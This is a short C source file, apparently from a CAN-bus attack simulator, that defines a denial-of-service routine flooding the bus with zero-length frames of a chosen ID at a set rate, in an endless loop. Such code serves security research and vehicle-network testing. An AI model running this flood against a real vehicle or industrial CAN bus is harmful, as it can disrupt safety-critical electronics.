#include <stdio.h>
#include <stdint.h>

#include "bus.h"
#include "can_types.h"
#include "util.h"

void attack_dos_flood(uint32_t id, int rate_hz)
{
    if (rate_hz <= 0) {
        rate_hz = 10; // default safe value in simulation
    }

    can_frame_t frame;
    frame.id  = id;
    frame.dlc = 0;

    printf("[ATTACK_DOS] Starting DoS flood on ID 0x%03X at %d Hz\n",
           frame.id, rate_hz);

    while (1) {
        bus_send_frame(&frame);
        util_sleep_ms(1000 / rate_hz);
    }
}
